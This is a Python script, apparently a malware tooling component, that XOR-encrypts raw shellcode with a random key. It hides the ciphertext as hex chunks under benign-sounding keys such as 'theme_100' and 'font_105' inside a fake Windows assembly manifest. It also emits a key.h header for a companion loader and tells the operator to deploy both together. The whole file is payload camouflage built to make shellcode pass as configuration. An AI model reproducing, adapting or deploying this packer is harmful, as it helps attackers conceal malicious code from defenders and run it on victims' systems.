#!/usr/bin/env python3

import argparse
import secrets
import sys

PREFIXES = ["theme", "layout", "hint", "render", "guid", "font"]


def main() -> int:
    ap = argparse.ArgumentParser(description="shellcode -> camouflaged .manifest + key.h")
    ap.add_argument("input", help="raw shellcode file (.bin)")
    ap.add_argument("-o", "--output", default="config.manifest")
    ap.add_argument("--key-out", default="key.h")
    ap.add_argument("-k", "--keylen", type=int, default=8)
    args = ap.parse_args()

    try:
        with open(args.input, "rb") as f:
            sc = f.read()
    except OSError as e:
        print(f"[-] cannot read {args.input}: {e}", file=sys.stderr)
        return 1

    if not sc:
        print("[-] input file is empty", file=sys.stderr)
        return 1
    if len(sc) < 32:
        print(f"[!] WARNING: input is only {len(sc)} bytes — placeholder-sized. "
              f"Loader will run but do nothing observable.", file=sys.stderr)

    key = secrets.token_bytes(args.keylen)
    enc = bytes(b ^ key[i % len(key)] for i, b in enumerate(sc))
    hexdata = enc.hex()

    chunks = [hexdata[i:i + 64] for i in range(0, len(hexdata), 64)]
    entries = "".join(
        f'        <entry key="{PREFIXES[i % len(PREFIXES)]}_{100 + i}" value="{c}"/>\n'
        for i, c in enumerate(chunks)
    )

    manifest = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
        '<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">\n'
        '  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">\n'
        '    <security>\n'
        '      <requestedPrivileges>\n'
        '        <requestedExecutionLevel level="asInvoker" uiAccess="false"/>\n'
        '      </requestedPrivileges>\n'
        '      <config>\n'
        f'{entries}      </config>\n'
        '    </security>\n'
        '  </trustInfo>\n'
        '</assembly>\n'
    )

    with open(args.output, "w", encoding="utf-8", newline="\n") as f:
        f.write(manifest)

    with open(args.key_out, "w", encoding="utf-8", newline="\n") as f:
        f.write("/* generated by make_manifest.py — must pair with config.manifest */\n")
        f.write("#ifndef KEY_H\n#define KEY_H\n\n")
        f.write(f"unsigned char xor_key[] = {{ {', '.join(f'0x{b:02x}' for b in key)} }};\n\n")
        f.write("#endif /* KEY_H */\n")

    print(f"[+] {args.input}: {len(sc)} bytes -> {args.output} "
          f"({len(chunks)} entries) + {args.key_out} (key {len(key)} B)")
    print(f"[!] deploy {args.output} and the loader TOGETHER, same directory, "
          f"launch with CWD = that directory")
    return 0


if __name__ == "__main__":
    sys.exit(main())
